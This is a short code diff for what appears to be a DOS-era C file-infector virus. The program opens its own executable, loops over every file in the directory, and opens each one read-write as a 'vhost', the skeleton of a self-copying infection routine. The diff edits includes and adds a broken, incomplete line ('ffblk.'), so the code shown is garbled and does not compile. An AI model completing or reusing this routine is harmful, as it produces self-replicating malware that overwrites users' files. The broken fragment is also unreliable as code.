@@ -7,7 +7,8 @@
 //
 
 #include <stdio.h>
-
+#include <time.h> /* clock_t, clock */
+#include <dir.h>
 FILE *Class, *vClass;
 
 int owned = 0;
@@ -19,10 +20,11 @@ clock_t st, end;
 int main(int argc, char** argv)
 {
     st = clock();
-    clrscr();
+    // clrscr();
     owned = (find_first("*.*", &ffblk, 0));
     while (!done) {
-        Class = fopen(_arg[0], "rb");
+        Class = fopen(argv[0], "rb");
+        ffblk.
         vhost = fopen(ffblk.ff_name, "rb+");
         if (vhost == NULL) {
             goto next;
